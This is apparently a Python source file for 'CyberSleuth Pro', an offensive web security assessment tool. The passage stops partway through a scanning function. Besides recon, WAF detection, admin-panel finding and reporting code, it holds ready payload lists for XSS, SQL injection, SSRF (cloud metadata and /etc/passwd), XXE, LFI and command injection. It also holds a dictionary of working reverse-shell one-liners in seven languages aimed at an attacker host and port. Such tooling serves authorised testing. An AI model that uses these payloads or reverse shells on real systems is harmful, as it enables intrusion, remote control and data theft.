#!/usr/bin/env python3
# CyberSleuth Pro - Advanced Web Security Assessment Framework
# By CyberWarLab
# Version 5.0 - Professional Edition

import os
import sys
import time
import socket
import requests
import subprocess
import dns.resolver
import whois
import ssl
import concurrent.futures
import re
import json
from datetime import datetime
from urllib.parse import urlparse, urljoin, quote
from bs4 import BeautifulSoup
from colorama import Fore, Style, init
import pyfiglet
import argparse
import random
import threading
import OpenSSL
import nmap
from socket import getservbyport
import paramiko
import ftplib
import smtplib
import xml.etree.ElementTree as ET
import zipfile
import tarfile
import shutil
import base64
import binascii
import struct
import select
import pty
import fcntl
import termios
import tty
import hashlib
import sqlite3
import csv
import xml.dom.minidom
from http.server import BaseHTTPRequestHandler, HTTPServer
from socketserver import ThreadingMixIn

# Initialize colorama
init(autoreset=True)

# --- Constants ---
VERSION = "5.0 Professional"
AUTHOR = "CyberwarLab"
BANNER_NAME = "CyberSleuth Pro"
REPORT_DIR = "reports"
DB_FILE = "vulnerabilities.db"

# Security-related constants
WAF_SIGNATURES = {
    'Cloudflare': ['cloudflare', '__cfduid', 'cf-ray', 'server: cloudflare', 'cf-cache-status'],
    'Akamai': ['akamai', 'x-akamai', 'x-akamai-transformed', 'akamai-x-cache-on'],
    'Imperva': ['incap_ses', 'visid_incap', 'x-cdn: imperva', 'x-iinfo'],
    'Sucuri': ['sucuri_cloudproxy', 'x-sucuri-id', 'x-sucuri-cache'],
    'AWS WAF': ['awsalb', 'x-aws-id', 'x-aws-request-id'],
    'Barracuda': ['barracuda'],
    'F5 BIG-IP': ['f5', 'bigip', 'x-ws-info'],
    'FortiWeb': ['fortiweb', 'fwb'],
    'ModSecurity': ['mod_security', 'modsecurity']
}

XSS_PAYLOADS = [
    "<script>alert('XSS')</script>",
    "<img src=x onerror=alert('XSS')>",
    "<svg/onload=alert('XSS')>",
    "<body onload=alert('XSS')>",
    "<iframe src='javascript:alert(\"XSS\")'>",
    "'\"><script>alert('XSS')</script>",
    "javascript:alert('XSS')",
    "data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4="
]

SQLI_PAYLOADS = [
    "' OR '1'='1",
    "' OR 1=1--",
    "\" OR \"\"=\"",
    "' OR ''='",
    "' OR 1=1#",
    "\" OR 1=1--",
    "' OR 'a'='a",
    "\" OR \"a\"=\"a",
    "') OR ('a'='a",
    "\") OR (\"a\"=\"a"
]

SSRF_PAYLOADS = [
    "http://localhost",
    "http://127.0.0.1",
    "http://169.254.169.254/latest/meta-data/",
    "file:///etc/passwd",
    "gopher://localhost:80/_GET%20HTTP/1.1%0D%0AHost:%20localhost%0D%0A%0D%0A",
    "dict://localhost:80/info"
]

CORS_PAYLOADS = [
    {"Origin": "https://evil.com"},
    {"Origin": "null"},
    {"Origin": "http://attacker.com"},
    {"Origin": "https://attacker.com"},
    {"Origin": "https://subdomain.target.com"}
]

API_TEST_PAYLOADS = [
    ('/api/users', 'GET', {'id': '1'}, None),
    ('/api/users', 'POST', None, {'username': 'admin', 'password': 'password'}),
    ('/api/users/1', 'PUT', None, {'email': 'admin@example.com'}),
    ('/api/users/1', 'DELETE', None, None)
]

ADMIN_PANELS = [
    'admin', 'administrator', 'wp-admin', 'wp-login', 'login', 
    'panel', 'manage', 'manager', 'admincp', 'adminpanel',
    'user', 'controlpanel', 'cpanel', 'whm', 'webadmin',
    'adminarea', 'backend', 'secure', 'account', 'member',
    'moderator', 'sysadmin', 'dashboard', 'admindashboard'
]

COMMON_PORTS = {
    'FTP': 21,
    'SSH': 22,
    'Telnet': 23,
    'SMTP': 25,
    'DNS': 53,
    'HTTP': 80,
    'HTTPS': 443,
    'SMB': 445,
    'MySQL': 3306,
    'RDP': 3389,
    'PostgreSQL': 5432,
    'Redis': 6379,
    'MongoDB': 27017,
    'VNC': 5900
}

REVERSE_SHELLS = {
    'Bash': 'bash -i >& /dev/tcp/{LHOST}/{LPORT} 0>&1',
    'Python': 'python -c \'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("{LHOST}",{LPORT}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);\'',
    'Perl': 'perl -e \'use Socket;$i="{LHOST}";$p={LPORT};socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};\'',
    'PHP': 'php -r \'$sock=fsockopen("{LHOST}",{LPORT});exec("/bin/sh -i <&3 >&3 2>&3");\'',
    'Ruby': 'ruby -rsocket -e\'f=TCPSocket.open("{LHOST}",{LPORT}).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)\'',
    'Netcat': 'nc -e /bin/sh {LHOST} {LPORT}',
    'Java': r'r = Runtime.getRuntime(); p = r.exec(["/bin/bash","-c","exec 5<>/dev/tcp/{LHOST}/{LPORT};cat <&5 | while read line; do $line 2>&5 >&5; done"] as String[]); p.waitFor();'
}

CVE_DATABASE = {
    'CVE-2021-44228': {'name': 'Log4Shell', 'port': 80, 'service': 'HTTP', 'severity': 'Critical'},
    'CVE-2017-0144': {'name': 'EternalBlue', 'port': 445, 'service': 'SMB', 'severity': 'Critical'},
    'CVE-2014-0160': {'name': 'Heartbleed', 'port': 443, 'service': 'OpenSSL', 'severity': 'High'},
    'CVE-2017-5638': {'name': 'Apache Struts RCE', 'port': 80, 'service': 'HTTP', 'severity': 'Critical'},
    'CVE-2019-0708': {'name': 'BlueKeep', 'port': 3389, 'service': 'RDP', 'severity': 'Critical'},
    'CVE-2020-1472': {'name': 'Zerologon', 'port': 445, 'service': 'Netlogon', 'severity': 'Critical'},
    'CVE-2018-7600': {'name': 'Drupalgeddon2', 'port': 80, 'service': 'HTTP', 'severity': 'Critical'},
    'CVE-2019-11510': {'name': 'Pulse Secure SSL VPN', 'port': 443, 'service': 'HTTPS', 'severity': 'Critical'},
    'CVE-2020-3452': {'name': 'Cisco ASA Path Traversal', 'port': 443, 'service': 'HTTPS', 'severity': 'High'},
    'CVE-2021-26084': {'name': 'Confluence RCE', 'port': 8090, 'service': 'HTTP', 'severity': 'Critical'}
}

# --- ASCII Art ---
def show_hacker_art():
    arts = [
        r"""
          _____          __  __ ______    ______      ________ _____  
         / ____|   /\   |  \/  |  ____|  / __ \ \    / /  ____|  __ \ 
        | |       /  \  | \  / | |__    | |  | \ \  / /| |__  | |__) |
        | |      / /\ \ | |\/| |  __|   | |  | |\ \/ / |  __| |  _  / 
        | |____ / ____ \| |  | | |____  | |__| | \  /  | |____| | \ \ 
         \_____/_/    \_\_|  |_|______|  \____/   \/   |______|_|  \_\
        """,
        r"""
         ██████╗██╗   ██╗██████╗ ███████╗██████╗ ███████╗██╗  ██╗
        ██╔════╝╚██╗ ██╔╝██╔══██╗██╔════╝██╔══██╗██╔════╝██║  ██║
        ██║      ╚████╔╝ ██████╔╝█████╗  ██████╔╝███████╗███████║
        ██║       ╚██╔╝  ██╔══██╗██╔══╝  ██╔══██╗╚════██║██╔══██║
        ╚██████╗   ██║   ██║  ██║███████╗██║  ██║███████║██║  ██║
         ╚═════╝   ██║   ██║  ██║╚══════╝╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝
        """,
        r"""
        .----------------.  .----------------.  .----------------. 
        | .--------------. || .--------------. || .--------------. |
        | |   ______     | || |      __      | || |  _________   | |
        | |  |_   __ \   | || |     /  \     | || |  |_   _|  |  | |
        | |    | |__) |  | || |    / /\ \    | || |    | |    |  | |
        | |    |  ___/   | || |   / ____ \   | || |    | |    |  | |
        | |   _| |_      | || | _/ /    \ \_ | || |   _| |_   |  | |
        | |  |_____|     | || ||____|  |____|| || |  |_____|  |  | |
        | |              | || |              | || |              | |
        | '--------------' || '--------------' || '--------------' |
        '----------------'  '----------------'  '----------------' 
        """
    ]
    print(Fore.RED + random.choice(arts))

# --- UI Utilities ---
def slow_print(text, speed=0.005):
    for char in text + '\n':
        sys.stdout.write(char)
        sys.stdout.flush()
        time.sleep(speed)

def print_status(msg, status):
    if status == "info":
        print(Fore.CYAN + "[*] " + msg)
    elif status == "success":
        print(Fore.GREEN + "[+] " + msg)
    elif status == "warning":
        print(Fore.YELLOW + "[!] " + msg)
    elif status == "error":
        print(Fore.RED + "[-] " + msg)
    elif status == "critical":
        print(Fore.RED + Style.BRIGHT + "[!] " + msg)

def print_banner():
    os.system("clear" if os.name != "nt" else "cls")
    show_hacker_art()
    ascii_banner = pyfiglet.figlet_format(BANNER_NAME, font="slant")
    print(Fore.CYAN + ascii_banner)
    print(Fore.YELLOW + f"Version: {VERSION} | Author: {AUTHOR}")
    print(Fore.RED + Style.BRIGHT + "WARNING: For authorized security testing only!\n")

def legal_warning():
    """Display legal disclaimer"""
    os.system("clear" if os.name != "nt" else "cls")
    print(Fore.RED + Style.BRIGHT + """
    ██████╗ ██╗   ██╗██████╗ ███████╗██████╗ ███████╗██╗  ██╗
    ██╔══██╗╚██╗ ██╔╝██╔══██╗██╔════╝██╔══██╗██╔════╝██║  ██║
    ██████╔╝ ╚████╔╝ ██████╔╝█████╗  ██████╔╝███████╗███████║
    ██╔══██╗  ╚██╔╝  ██╔══██╗██╔══╝  ██╔══██╗╚════██║██╔══██║
    ██████╔╝   ██║   ██║  ██║███████╗██║  ██║███████║██║  ██║
    ╚═════╝    ██║   ██║  ██║╚══════╝╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝
    """)
    print(Fore.RED + Style.BRIGHT + "WARNING: UNAUTHORIZED TESTING IS ILLEGAL!")
    print(Fore.YELLOW + "This tool is for authorized security testing only.")
    print(Fore.YELLOW + "By using this tool, you agree to use it ethically and legally.")
    consent = input(Fore.GREEN + "\nDo you have permission to test the target? (y/N): ").strip().lower()
    if consent != 'y':
        sys.exit(0)

def init_db():
    """Initialize vulnerability database"""
    try:
        conn = sqlite3.connect(DB_FILE)
        c = conn.cursor()
        c.execute('''CREATE TABLE IF NOT EXISTS findings
                     (id INTEGER PRIMARY KEY AUTOINCREMENT,
                      target TEXT,
                      vulnerability TEXT,
                      type TEXT,
                      severity TEXT,
                      details TEXT,
                      timestamp DATETIME DEFAULT CURRENT_TIMESTAMP)''')
        conn.commit()
        conn.close()
    except Exception as e:
        print_status(f"Database error: {str(e)}", "error")

def save_finding(target, vulnerability, vuln_type, severity, details=""):
    """Save vulnerability finding to database"""
    try:
        conn = sqlite3.connect(DB_FILE)
        c = conn.cursor()
        c.execute("INSERT INTO findings (target, vulnerability, type, severity, details) VALUES (?, ?, ?, ?, ?)",
                  (target, vulnerability, vuln_type, severity, details))
        conn.commit()
        conn.close()
    except Exception as e:
        print_status(f"Failed to save finding: {str(e)}", "error")

def generate_report(target, format="html"):
    """Generate vulnerability report"""
    try:
        if not os.path.exists(REPORT_DIR):
            os.makedirs(REPORT_DIR)

        conn = sqlite3.connect(DB_FILE)
        c = conn.cursor()
        c.execute("SELECT * FROM findings WHERE target=?", (target,))
        findings = c.fetchall()
        conn.close()

        if not findings:
            print_status("No findings to report", "warning")
            return

        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        report_file = os.path.join(REPORT_DIR, f"report_{target}_{timestamp}.{format}")

        if format == "html":
            with open(report_file, 'w') as f:
                f.write(f"<html><head><title>Security Report for {target}</title></head><body>")
                f.write(f"<h1>Security Assessment Report</h1>")
                f.write(f"<h2>Target: {target}</h2>")
                f.write(f"<p>Generated on: {datetime.now()}</p>")
                f.write("<table border='1'><tr><th>Vulnerability</th><th>Type</th><th>Severity</th><th>Details</th></tr>")
                for finding in findings:
                    f.write(f"<tr><td>{finding[2]}</td><td>{finding[3]}</td><td>{finding[4]}</td><td>{finding[5]}</td></tr>")
                f.write("</table></body></html>")
        elif format == "json":
            report_data = {
                "target": target,
                "date": str(datetime.now()),
                "findings": [{
                    "vulnerability": finding[2],
                    "type": finding[3],
                    "severity": finding[4],
                    "details": finding[5]
                } for finding in findings]
            }
            with open(report_file, 'w') as f:
                json.dump(report_data, f, indent=4)
        else:  # txt
            with open(report_file, 'w') as f:
                f.write(f"Security Assessment Report\n")
                f.write(f"Target: {target}\n")
                f.write(f"Date: {datetime.now()}\n\n")
                f.write("Findings:\n")
                for finding in findings:
                    f.write(f"- {finding[2]} ({finding[3]}, {finding[4]}): {finding[5]}\n")

        print_status(f"Report generated: {report_file}", "success")
    except Exception as e:
        print_status(f"Report generation failed: {str(e)}", "error")

# --- Advanced Web Testing Module ---
class AdvancedWebTester:
    """Comprehensive web vulnerability testing module"""

    @staticmethod
    def test_xss(target_url, xss_type="all"):
        """Test for various types of XSS vulnerabilities"""
        print_status(f"Testing for {xss_type} XSS vulnerabilities on {target_url}", "info")
        
        vulnerable = False
        test_params = {
            'query': 'test',
            'search': 'xss',
            'q': 'test',
            'id': '1',
            'name': 'test'
        }
        
        for param in test_params:
            for payload in XSS_PAYLOADS:
                try:
                    test_url = f"{target_url}?{param}={quote(payload)}"
                    response = requests.get(test_url, timeout=10)
                    
                    if payload in response.text:
                        print_status(f"Potential XSS found in parameter {param} with payload: {payload}", "warning")
                        save_finding(target_url, "Cross-Site Scripting (XSS)", "XSS", "High", 
                                   f"Parameter: {param}, Payload: {payload}")
                        vulnerable = True
                        break
                except Exception as e:
                    print_status(f"Error testing XSS: {str(e)}", "error")
                    continue
        
        if not vulnerable:
            print_status("No XSS vulnerabilities detected", "success")

    @staticmethod
    def test_sqli(target_url):
        """Test for SQL injection vulnerabilities"""
        print_status(f"Testing for SQL injection on {target_url}", "info")
        
        vulnerable = False
        test_params = {
            'id': '1',
            'user': 'admin',
            'name': 'test',
            'search': 'test'
        }
        
        for param in test_params:
            for payload in SQLI_PAYLOADS:
                try:
                    test_url = f"{target_url}?{param}={quote(payload)}"
                    response = requests.get(test_url, timeout=10)
                    
                    if "error in your SQL syntax" in response.text.lower():
                        print_status(f"Potential SQLi found in parameter {param} with payload: {payload}", "warning")
                        save_finding(target_url, "SQL Injection", "SQLi", "Critical", 
                                   f"Parameter: {param}, Payload: {payload}")
                        vulnerable = True
                        break
                    elif "mysql_fetch_array()" in response.text.lower():
                        print_status(f"Potential SQLi found in parameter {param} with payload: {payload}", "warning")
                        save_finding(target_url, "SQL Injection", "SQLi", "Critical", 
                                   f"Parameter: {param}, Payload: {payload}")
                        vulnerable = True
                        break
                except Exception as e:
                    print_status(f"Error testing SQLi: {str(e)}", "error")
                    continue
        
        if not vulnerable:
            print_status("No SQL injection vulnerabilities detected", "success")

    @staticmethod
    def test_ssrf(target_url):
        """Test for Server-Side Request Forgery vulnerabilities"""
        print_status(f"Testing for SSRF on {target_url}", "info")
        
        vulnerable = False
        test_params = {
            'url': 'http://example.com',
            'image': 'test.jpg',
            'load': 'data.xml'
        }
        
        for param in test_params:
            for payload in SSRF_PAYLOADS:
                try:
                    test_url = f"{target_url}?{param}={quote(payload)}"
                    response = requests.get(test_url, timeout=10)
                    
                    if "localhost" in response.text or "127.0.0.1" in response.text:
                        print_status(f"Potential SSRF found in parameter {param} with payload: {payload}", "warning")
                        save_finding(target_url, "Server-Side Request Forgery", "SSRF", "High", 
                                   f"Parameter: {param}, Payload: {payload}")
                        vulnerable = True
                        break
                except Exception as e:
                    print_status(f"Error testing SSRF: {str(e)}", "error")
                    continue
        
        if not vulnerable:
            print_status("No SSRF vulnerabilities detected", "success")

    @staticmethod
    def test_cors(target_url):
        """Test for CORS misconfigurations"""
        print_status(f"Testing for CORS misconfigurations on {target_url}", "info")
        
        vulnerable = False
        
        for payload in CORS_PAYLOADS:
            try:
                response = requests.get(target_url, headers=payload, timeout=10)
                
                if "Access-Control-Allow-Origin" in response.headers:
                    if response.headers["Access-Control-Allow-Origin"] == payload["Origin"]:
                        print_status(f"Insecure CORS configuration allows origin: {payload['Origin']}", "warning")
                        save_finding(target_url, "CORS Misconfiguration", "CORS", "Medium", 
                                   f"Allowed Origin: {payload['Origin']}")
                        vulnerable = True
            except Exception as e:
                print_status(f"Error testing CORS: {str(e)}", "error")
                continue
        
        if not vulnerable:
            print_status("No CORS misconfigurations detected", "success")

    @staticmethod
    def test_api(target_url):
        """Test API endpoints for common vulnerabilities"""
        print_status(f"Testing API endpoints on {target_url}", "info")
        
        vulnerable = False
        
        for endpoint, method, params, data in API_TEST_PAYLOADS:
            try:
                full_url = f"{target_url}{endpoint}"
                
                if method == 'GET':
                    response = requests.get(full_url, params=params, timeout=10)
                elif method == 'POST':
                    response = requests.post(full_url, json=data, timeout=10)
                elif method == 'PUT':
                    response = requests.put(full_url, json=data, timeout=10)
                elif method == 'DELETE':
                    response = requests.delete(full_url, timeout=10)
                
                # Check for common API vulnerabilities
                if response.status_code == 401 and 'Basic' in response.headers.get('WWW-Authenticate', ''):
                    print_status(f"Basic Authentication exposed at {full_url}", "warning")
                    save_finding(target_url, "Exposed Basic Authentication", "API", "Medium", 
                               f"Endpoint: {endpoint}, Method: {method}")
                    vulnerable = True
                
                if response.status_code == 200 and 'password' in response.text.lower():
                    print_status(f"Potential sensitive data exposure at {full_url}", "warning")
                    save_finding(target_url, "Sensitive Data Exposure", "API", "High", 
                               f"Endpoint: {endpoint}, Method: {method}")
                    vulnerable = True
                
                if response.status_code == 500 and 'error' in response.text.lower():
                    print_status(f"Information disclosure at {full_url} (500 error)", "warning")
                    save_finding(target_url, "Information Disclosure", "API", "Medium", 
                               f"Endpoint: {endpoint}, Method: {method}")
                    vulnerable = True
                
            except Exception as e:
                print_status(f"Error testing API: {str(e)}", "error")
                continue
        
        if not vulnerable:
            print_status("No obvious API vulnerabilities detected", "success")

# --- Admin Panel Finder ---
class AdminPanelFinder:
    @staticmethod
    def find_admin_panels(target):
        """Find common admin panel paths"""
        print_status("Searching for admin panels...", "info")
        
        if not target.startswith('http'):
            target = f"http://{target}"
            
        found = False
        for panel in ADMIN_PANELS:
            try:
                url = f"{target}/{panel}"
                response = requests.get(url, timeout=5)
                
                if response.status_code == 200:
                    title = BeautifulSoup(response.text, 'html.parser').title
                    title_text = title.string if title else "No Title"
                    print_status(f"Found admin panel: {url} - Title: {title_text}", "success")
                    found = True
                elif response.status_code == 403:
                    print_status(f"Potential admin panel (403 Forbidden): {url}", "warning")
                    found = True
                    
            except requests.RequestException:
                continue
                
        if not found:
            print_status("No admin panels found with common paths", "info")

# --- SSL Cipher Scanner ---
class SSLCipherScanner:
    @staticmethod
    def scan_ciphers(target):
        """Scan for weak SSL/TLS ciphers"""
        print_status("Scanning SSL/TLS cipher weaknesses...", "info")
        
        try:
            # Connect and get certificate
            context = ssl.create_default_context()
            context.set_ciphers('ALL:@SECLEVEL=0')
            
            with socket.create_connection((target, 443)) as sock:
                with context.wrap_socket(sock, server_hostname=target) as ssock:
                    cert = ssock.getpeercert(binary_form=True)
                    x509 = OpenSSL.crypto.load_certificate(OpenSSL.crypto.FILETYPE_ASN1, cert)
                    
                    # Print certificate info
                    print_status("Certificate Information:", "success")
                    print(f"  Subject: {x509.get_subject()}")
                    print(f"  Issuer: {x509.get_issuer()}")
                    print(f"  Version: {x509.get_version() + 1}")
                    print(f"  Serial Number: {hex(x509.get_serial_number())}")
                    print(f"  Not Before: {x509.get_notBefore().decode('utf-8')}")
                    print(f"  Not After: {x509.get_notAfter().decode('utf-8')}")
                    
                    # Check ciphers
                    print_status("\nTesting cipher suites (this may take a moment)...", "info")
                    weak_ciphers = []
                    ciphers = [
                        'AES256-SHA', 'AES128-SHA', 'DES-CBC3-SHA',
                        'RC4-SHA', 'RC4-MD5', 'CAMELLIA256-SHA',
                        'CAMELLIA128-SHA', 'SEED-SHA', 'IDEA-CBC-SHA',
                        'ECDHE-RSA-AES256-SHA', 'ECDHE-RSA-AES128-SHA',
                        'ECDHE-RSA-DES-CBC3-SHA', 'DHE-RSA-AES256-SHA',
                        'DHE-RSA-AES128-SHA', 'DHE-RSA-CAMELLIA256-SHA',
                        'DHE-RSA-CAMELLIA128-SHA', 'DHE-RSA-SEED-SHA',
                        'ECDHE-RSA-RC4-SHA', 'ECDHE-RSA-NULL-SHA'
                    ]
                    
                    for cipher in ciphers:
                        try:
                            context = ssl.SSLContext(ssl.PROTOCOL_TLS)
                            context.set_ciphers(cipher)
                            with socket.create_connection((target, 443)) as s:
                                with context.wrap_socket(s, server_hostname=target) as sock:
                                    print_status(f"Supported (Weak): {cipher}", "warning")
                                    weak_ciphers.append(cipher)
                        except:
                            continue
                    
                    if not weak_ciphers:
                        print_status("No weak cipher suites detected", "success")
                    else:
                        print_status(f"Found {len(weak_ciphers)} potentially weak cipher suites", "warning")
                        
        except Exception as e:
            print_status(f"SSL cipher scan failed: {str(e)}", "error")

# --- GeoIP Locator ---
class GeoIPLocator:
    @staticmethod
    def locate_ip(target):
        """Get GeoIP information for an IP address"""
        print_status("Performing GeoIP lookup...", "info")
        
        try:
            # First resolve hostname to IP if needed
            try:
                ip = socket.gethostbyname(target)
            except:
                ip = target
                
            # Check if it's a private IP
            if ip.startswith(('10.', '172.', '192.168.', '127.')):
                print_status("Private IP address detected - no GeoIP data available", "warning")
                return
                
            # Use local GeoLite2 database if available
            db_path = 'GeoLite2-City.mmdb'
            if os.path.exists(db_path):
                try:
                    import geoip2.database
                    reader = geoip2.database.Reader(db_path)
                    response = reader.city(ip)
                    
                    print_status("GeoIP Information:", "success")
                    print(f"  IP Address: {ip}")
                    print(f"  Country: {response.country.name} ({response.country.iso_code})")
                    print(f"  City: {response.city.name}")
                    print(f"  Postal Code: {response.postal.code}")
                    print(f"  Location: {response.location.latitude}, {response.location.longitude}")
                    print(f"  Time Zone: {response.location.time_zone}")
                    print(f"  ISP: {response.traits.isp if 'isp' in response.traits else 'Unknown'}")
                    print(f"  Organization: {response.traits.organization if 'organization' in response.traits else 'Unknown'}")
                    
                    reader.close()
                except ImportError:
                    print_status("geoip2 module not found, using API fallback", "warning")
                    GeoIPLocator._geoip_api_fallback(ip)
            else:
                GeoIPLocator._geoip_api_fallback(ip)
                    
        except Exception as e:
            print_status(f"GeoIP lookup failed: {str(e)}", "error")

    @staticmethod
    def _geoip_api_fallback(ip):
        """Fallback to IP-API for GeoIP data"""
        try:
            url = f"http://ip-api.com/json/{ip}"
            response = requests.get(url).json()
            
            if response['status'] == 'success':
                print_status("GeoIP Information:", "success")
                print(f"  IP Address: {ip}")
                print(f"  Country: {response['country']} ({response['countryCode']})")
                print(f"  Region: {response['regionName']} ({response['region']})")
                print(f"  City: {response['city']}")
                print(f"  ZIP: {response['zip']}")
                print(f"  Location: {response['lat']}, {response['lon']}")
                print(f"  ISP: {response['isp']}")
                print(f"  Organization: {response['org']}")
                print(f"  AS: {response['as']}")
            else:
                print_status("GeoIP lookup failed", "error")
        except Exception as e:
            print_status(f"GeoIP API fallback failed: {str(e)}", "error")

# --- Enhanced WAF Detection ---
class WAFDetector:
    @staticmethod
    def enhanced_waf_detection(target):
        """Enhanced WAF detection with more techniques"""
        print_status("Running enhanced WAF detection...", "info")
        
        try:
            url = f"http://{target}"
            response = requests.get(url, timeout=10)
            headers = response.headers
            detected = False
            
            for waf, signatures in WAF_SIGNATURES.items():
                for sig in signatures:
                    if sig.lower() in str(headers).lower():
                        print_status(f"Detected WAF (Header): {waf} (Signature: {sig})", "success")
                        detected = True
                        break
                        
            # Method 2: Response body inspection
            if not detected:
                for waf, signatures in WAF_SIGNATURES.items():
                    for sig in signatures:
                        if sig.lower() in response.text.lower():
                            print_status(f"Detected WAF (Body): {waf} (Signature: {sig})", "success")
                            detected = True
                            break
                            
            # Method 3: Response code analysis
            if not detected:
                test_url = f"{url}/?<script>alert(1)</script>"
                xss_response = requests.get(test_url, timeout=5)
                
                if xss_response.status_code in [403, 406, 419]:
                    print_status("WAF likely detected (blocked XSS test)", "warning")
                    detected = True
                    
            # Method 4: Time delay detection
            if not detected:
                start_time = time.time()
                requests.get(url, timeout=10)
                normal_time = time.time() - start_time
                
                malicious_url = f"{url}/../../../etc/passwd"
                start_time = time.time()
                requests.get(malicious_url, timeout=10)
                malicious_time = time.time() - start_time
                
                if malicious_time > normal_time * 2:
                    print_status("WAF likely detected (time delay on malicious request)", "warning")
                    detected = True
                    
            if not detected:
                print_status("No WAF detected (or using stealth configuration)", "info")
                
        except Exception as e:
            print_status(f"WAF detection failed: {str(e)}", "error")

# --- Core Recon Modules ---
class AdvancedRecon:
    @staticmethod
    def full_recon(target):
        """Comprehensive reconnaissance module"""
        print_status(f"Initiating full reconnaissance on {target}", "info")
        
        # Basic DNS and WHOIS
        AdvancedRecon.dns_whois_check(target)
        
        # Subdomain enumeration
        AdvancedRecon.subdomain_enum(target)
        
        # WAF detection
        WAFDetector.enhanced_waf_detection(target)
        
        # SSL/TLS analysis
        SSLCipherScanner.scan_ciphers(target)
        
        # Security headers check
        AdvancedRecon.security_headers_check(target)
        
        # Clickjacking test
        AdvancedRecon.clickjacking_test(target)
        
        # Phishing page detection
        AdvancedRecon.phishing_detection(target)
        
        # Admin panel finder
        AdminPanelFinder.find_admin_panels(target)
        
        # GeoIP lookup
        GeoIPLocator.locate_ip(target)

    @staticmethod
    def dns_whois_check(target):
        """Perform DNS and WHOIS lookups"""
        try:
            print_status("Performing DNS and WHOIS analysis...", "info")
            
            # DNS resolution
            ip = socket.gethostbyname(target)
            print_status(f"Resolved IP: {ip}", "success")
            
            # WHOIS lookup
            whois_info = whois.whois(target)
            print_status(f"Domain Registrar: {whois_info.registrar}", "success")
            print_status(f"Creation Date: {whois_info.creation_date}", "success")
            
            # DNS records
            record_types = ['A', 'MX', 'NS', 'TXT', 'CNAME']
            for record in record_types:
                try:
                    answers = dns.resolver.resolve(target, record)
                    print_status(f"{record} Records:", "success")
                    for rdata in answers:
                        print(f"  {rdata}")
                except:
                    continue
                    
        except Exception as e:
            print_status(f"Recon failed: {str(e)}", "error")

    @staticmethod
    def subdomain_enum(target):
        """Enumerate subdomains"""
        print_status("Enumerating subdomains...", "info")
        subdomains = []
        wordlist = ["www", "mail", "ftp", "admin", "webmail", "test", "dev"]
        
        for sub in wordlist:
            try:
                full_domain = f"{sub}.{target}"
                socket.gethostbyname(full_domain)
                subdomains.append(full_domain)
                print_status(f"Found subdomain: {full_domain}", "success")
            except:
                continue
                
        if not subdomains:
            print_status("No subdomains found with basic enumeration", "warning")

    @staticmethod
    def security_headers_check(target):
        """Check for security headers"""
        SECURITY_HEADERS = [
            'Content-Security-Policy',
            'X-Frame-Options',
            'X-Content-Type-Options',
            'X-XSS-Protection',
            'Strict-Transport-Security',
            'Referrer-Policy',
            'Feature-Policy',
            'Permissions-Policy'
        ]
        
        print_status("Analyzing security headers...", "info")
        try:
            url = f"https://{target}"
            response = requests.get(url, timeout=10)
            headers = response.headers
            
            missing = []
            for header in SECURITY_HEADERS:
                if header in headers:
                    print_status(f"Found header: {header}", "success")
                else:
                    missing.append(header)
                    print_status(f"Missing header: {header}", "warning")
                    
            if missing:
                print_status(f"Total missing security headers: {len(missing)}", "warning")
                
        except Exception as e:
            print_status(f"Header check failed: {str(e)}", "error")

    @staticmethod
    def clickjacking_test(target):
        """Test for clickjacking vulnerability"""
        print_status("Testing for clickjacking vulnerability...", "info")
        try:
            url = f"http://{target}"
            response = requests.get(url, timeout=10)
            headers = response.headers
            
            if 'X-Frame-Options' in headers:
                print_status("Clickjacking protection detected (X-Frame-Options)", "success")
            else:
                print_status("Potential clickjacking vulnerability detected", "warning")
                
        except Exception as e:
            print_status(f"Clickjacking test failed: {str(e)}", "error")

    @staticmethod
    def phishing_detection(target):
        """Check for phishing page indicators"""
        print_status("Checking for phishing indicators...", "info")
        try:
            url = f"http://{target}"
            response = requests.get(url, timeout=10)
            content = response.text.lower()
            
            indicators = [
                'login', 'password', 'account', 'verify', 'security',
                'update', 'bank', 'paypal', 'credit', 'card'
            ]
            
            found = []
            for indicator in indicators:
                if indicator in content:
                    found.append(indicator)
                    
            if found:
                print_status(f"Potential phishing indicators found: {', '.join(found)}", "warning")
            else:
                print_status("No obvious phishing indicators found", "info")
                
        except Exception as e:
            print_status(f"Phishing detection failed: {str(e)}", "error")

# --- Automated Scanner ---
class AutomatedScanner:
    @staticmethod
    def full_scan(target):
        """Comprehensive automated vulnerability scan"""
        print_status(f"Initiating full automated scan of {target}", "info")
        
        # Web vulnerability scanning
        AutomatedScanner.web_scan(target)
        
        # Network scanning
        AutomatedScanner.network_scan(target)
        
        # OSINT gathering
        AutomatedScanner.osint_gathering(target)
        
        # Admin panel finder
        AdminPanelFinder.find_admin_panels(target)
        
        # SSL cipher scan
        SSLCipherScanner.scan_ciphers(target)
        
        # GeoIP lookup
        GeoIPLocator.locate_ip(target)

    @staticmethod
    def web_scan(url):
        """Automated web vulnerability scanning"""
        print_status("Starting web vulnerability scan...", "info")
        
        # Check if URL needs protocol
        if not url.startswith('http'):
            url = f"http://{url}"
            
        # Test for common vulnerabilities
        tests = [
            ('SQL Injection', "' OR '1'='1"),
            ('XSS', "<script>alert(1)</script>"),
            ('LFI', "../../../../etc/passwd"),
            ('RCE', ";id"),
            ('SSRF', "http://localhost"),
            ('XXE', "<!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]>")
        ]
        
        for name, payload in tests:
            try:
                test_url = f"{url}?test={payload}" if '?' not in url else f"{url}&test={payload}"
                response = requests.get(test_url, timeout=10)
                
                if "error in your SQL syntax" in response.text.lower() and name == 'SQL Injection':
                    print_status(f"Potential {name} vulnerability detected", "warning")
                if payload in response.text and name == 'XSS':
                    print_status(f"Potential {name} vulnerability detected", "warning")
                if "root:" in response.text and name == 'LFI':
                    print_status(f"Potential {name} vulnerability detected", "warning")
                if "uid=" in response.text and name == 'RCE':
                    print_status(f"Potential {name} vulnerability detected", "warning")
                    
            except Exception as e:
